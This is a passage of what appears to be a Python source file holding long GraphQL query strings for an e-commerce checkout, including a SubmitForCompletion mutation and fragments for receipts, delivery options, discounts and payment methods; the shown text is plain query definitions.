UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}
"""

# MUTATION_SUBMIT
MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId 